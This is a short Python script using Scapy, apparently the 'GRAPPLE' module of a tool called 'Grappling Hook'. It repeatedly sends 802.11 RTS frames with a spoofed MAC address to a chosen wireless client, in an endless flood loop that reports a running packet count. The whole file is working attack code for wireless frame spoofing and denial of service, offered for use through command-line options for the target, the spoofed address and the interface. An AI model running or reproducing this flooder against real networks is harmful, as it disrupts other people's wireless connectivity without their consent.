### GRAPPLING HOOK -- GRAPPLE MODULE
### sendit function crafts the RTS with spoofed MAC of DF Tool (HOOK)
### Interface selected must be on monitor mode. Can run GRAPPLE and HOOK on same interface if necessary.


from scapy.all import *
from time import sleep
import optparse
import sys

def sendit(targetclient, receiveclient,interface):
    sendp(RadioTap()/Dot11(type=1, subtype=11, addr1=targetclient, addr2=receiveclient), iface=interface)
    sys.stdout.flush()
    

def main():
    parser = optparse.OptionParser('usage%prog '+'-t <targetclient> -r <receiveclient> -i <interface>')
    parser.add_option('-t', dest='targetclient', type='string', help='specify target client MAC address as XX:XX:XX:XX:XX:XX')
    parser.add_option('-r', dest='receiveclient', type='string', help='specify receive client MAC address as XX:XX:XX:XX:XX:XX')
    parser.add_option('-i', dest='interface', type='string', help='specify interface to send flood')
    (options, args) = parser.parse_args()
    
    targetclient = options.targetclient
    receiveclient = options.receiveclient
    interface = options.interface

    Flag = True
    count = 0
    
    while Flag:
        sendit(targetclient, receiveclient, interface)
        count = count +1
        sys.stdout.write('\r')
        sys.stdout.write("Flooded "+str(count)+" total packets.")
        sys.stdout.flush()

if __name__ == '__main__':
    main()



